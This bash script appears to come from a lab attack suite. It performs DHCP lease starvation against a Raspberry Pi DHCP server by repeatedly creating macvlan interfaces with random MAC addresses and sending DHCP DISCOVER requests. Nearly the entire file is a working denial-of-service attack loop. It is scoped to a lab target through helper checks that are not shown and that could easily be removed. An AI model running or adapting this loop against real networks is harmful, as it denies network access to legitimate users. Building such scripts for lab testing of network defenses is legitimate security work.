#!/usr/bin/env bash
# MAC churn / DHCP lease starvation: a fresh random MAC every --interval s, each sends a DHCP DISCOVER
# to the Pi. Uses a throwaway macvlan on --iface (deleted after each round), so the attacker's own
# address never changes. Pi only (it is the LAN's DHCP server). Attacker host only, root.
#   bash lab/attacks/mac_churn.sh --target <pi-ip> --iface IF --pi-ip IP --victim-net CIDR --protected-net CIDR \
#        [--interval 0.5] [--duration 20] [--dry-run]
source "$(dirname "${BASH_SOURCE[0]}")/_common.sh"
parse_common "$@"
INTERVAL=0.5
set -- "${REST[@]}"
while (($#)); do
  case "$1" in
    --interval) INTERVAL="${2:?}"; shift ;;
    *) no_extra_args "$@" ;;
  esac
  shift
done
require_pi_target
require_iface
[[ "$INTERVAL" =~ ^[0-9]+([.][0-9]+)?$ ]] || refuse "--interval must be a number of seconds"
tool_version dhclient
tool_version ip
# $1 = parent interface, $2 = interval. Locally administered unicast MACs (02:...), one per round.
LOOP='trap "ip link del pwchurn0 2>/dev/null" EXIT
while :; do
  mac=$(printf "02:%02x:%02x:%02x:%02x:%02x" $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)))
  ip link add link "$1" name pwchurn0 address "$mac" type macvlan mode bridge && ip link set pwchurn0 up
  timeout 2 dhclient -1 -d -sf /bin/true -pf /dev/null -lf /dev/null pwchurn0 >/dev/null 2>&1 || true
  ip link del pwchurn0 2>/dev/null || true
  sleep "$2"
done'
run_attack bash -c "$LOOP" mac-churn "$IFACE" "$INTERVAL"
